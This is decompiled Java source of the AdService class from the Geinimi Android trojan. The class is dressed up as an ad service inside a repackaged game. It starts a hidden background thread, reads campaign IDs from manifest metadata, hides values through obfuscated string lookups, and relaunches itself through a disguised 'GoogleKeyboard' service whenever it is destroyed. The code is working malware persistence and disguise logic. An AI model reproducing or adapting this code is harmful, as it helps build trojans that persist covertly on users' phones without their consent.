package com.geinimi;

import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ServiceInfo;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import com.geinimi.c.k;
import com.geinimi.c.m;

public class AdService extends Service {
    public static String a = "com.sumsharp.monster.MonsterMIDlet";
    public static String b = "release";
    private static String c = "3040";
    private static String d = "30410001";
    private static String e = "0003";
    private static String f = "1005";
    private static String g = "com.geinimi.custom.GoogleKeyboard";
    private static ServiceInfo j = null;
    private AdServiceThread h = null;
    private Handler i = null;

    public static void a() {
        if (b != null && b.endsWith(m.a(2))) {
            b = m.a(1);
        }
    }

    public static String b() {
        if (c != null && !c.endsWith(m.a(2))) {
            return c;
        }
        if (j == null || j.metaData == null) {
            c = null;
        } else {
            c = j.metaData.getString("cpid");
        }
        return c == null ? "001" : c;
    }

    public static String c() {
        if (d != null && !d.endsWith(m.a(2))) {
            return d;
        }
        if (j == null || j.metaData == null) {
            d = null;
        } else {
            d = j.metaData.getString("ptid");
        }
        return d == null ? "01" : d;
    }

    public static String d() {
        if (e != null && !e.endsWith(m.a(2))) {
            return e;
        }
        if (j == null || j.metaData == null) {
            e = null;
        } else {
            e = j.metaData.getString("salesid");
        }
        return e == null ? "001" : e;
    }

    public static String e() {
        if (f != null && !f.endsWith(m.a(2))) {
            return f;
        }
        if (j == null || j.metaData == null) {
            f = null;
        } else {
            f = j.metaData.getString("did");
        }
        return f == null ? "001" : f;
    }

    public static String f() {
        return (g == null || g.endsWith(m.a(2))) ? "com.geinimi.custom.GoogleKeyboard" : g;
    }

    public final void a(Runnable runnable) {
        if (this.i != null) {
            this.i.post(runnable);
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        new k(this);
        this.i = new Handler(Looper.getMainLooper());
        this.h = new AdServiceThread(this);
        this.h.start();
        try {
            j = getPackageManager().getServiceInfo(new ComponentName(this, AdService.class), 128);
        } catch (NameNotFoundException e2) {
        }
    }

    public void onDestroy() {
        try {
            super.onDestroy();
            this.h.stop();
            Class<?> cls = null;
            try {
                cls = Class.forName(f());
            } catch (Exception e2) {
            }
            if (cls != null) {
                startService(new Intent(this, cls));
            }
        } catch (Exception e3) {
        }
    }

    public void onLowMemory() {
        super.onLowMemory();
    }

    public void onStart(Intent intent, int i2) {
        super.onStart(intent, i2);
    }
}
